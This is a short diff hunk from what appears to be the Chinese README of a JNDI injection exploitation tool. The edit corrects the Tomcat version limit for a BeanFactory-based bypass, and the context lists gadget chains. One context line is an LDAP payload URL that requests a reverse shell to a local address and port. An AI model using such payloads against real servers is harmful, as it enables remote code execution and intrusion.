@@ -103,7 +103,7 @@ ldap://127.0.0.1:1389/Basic/ReverseShell/MTI3LjAuMC4x/NDQ0NA==
 - Groovy ClassLoader/Shell
 - SnakeYaml
 
-上述方式均依赖于 BeanFactory, 因此 Tomcat 版本需小于 8.5.79
+上述方式均依赖于 BeanFactory, 因此 Tomcat 版本需小于 8.5.79 或 9.0.63
 
 ```bash
 # Tomcat Bypass
